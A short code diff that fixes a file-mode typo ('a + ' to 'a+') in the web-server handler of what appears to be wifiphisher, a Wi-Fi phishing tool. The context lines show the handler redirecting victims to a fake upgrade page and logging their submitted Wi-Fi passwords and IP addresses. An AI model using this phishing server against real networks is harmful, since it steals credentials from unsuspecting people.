@@ -214,7 +214,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 
         if self.path == "/":
             wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
-            with open(wifi_webserver_tmp, "a + ") as log_file:
+            with open(wifi_webserver_tmp, "a+") as log_file:
                 log_file.write('[' + T + '*' + W + '] ' + O + "GET " + T +
                                self.client_address[0] + W + "\n"
                                )
@@ -251,7 +251,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                 self.send_header('Location', '/upgrading.html')
                 self.end_headers()
                 wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
-                with open(wifi_webserver_tmp, "a + ") as log_file:
+                with open(wifi_webserver_tmp, "a+") as log_file:
                     log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
                                    T + self.client_address[0] +
                                    R + " password=" + item.value +
